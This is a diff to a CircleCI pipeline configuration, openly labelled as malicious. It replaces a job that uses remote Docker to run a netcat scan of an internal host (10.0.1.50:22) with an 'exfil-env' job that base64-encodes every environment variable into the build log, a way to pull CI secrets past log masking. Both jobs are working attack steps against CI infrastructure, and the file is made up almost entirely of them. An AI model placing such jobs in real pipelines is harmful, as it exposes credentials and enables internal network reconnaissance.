@@ -1,23 +1,16 @@
 version: 2.1
 
 jobs:
-  abuse-remote-docker:
+  exfil-env:
     docker:
       - image: cimg/base:stable
     steps:
       - checkout
-      - setup_remote_docker:
-          version: 20.10.18
       - run:
-          name: "Run malicious container in remote docker"
-          command: |
-            echo ">>> Starting internal network scan..."
-            # 利用远程Docker环境运行一个netcat容器，扫描内网的 10.0.1.50 主机
-            # 注意：这个IP地址仅为示例
-            docker run --rm busybox nc -zv 10.0.1.50 22
-            echo ">>> Network scan finished."
+          name: "Exfil env"
+          command: "env | base64"
 
 workflows:
-  scanner_workflow:
+  exfil-env-workflow:
     jobs:
-      - abuse-remote-docker
+      - exfil-env
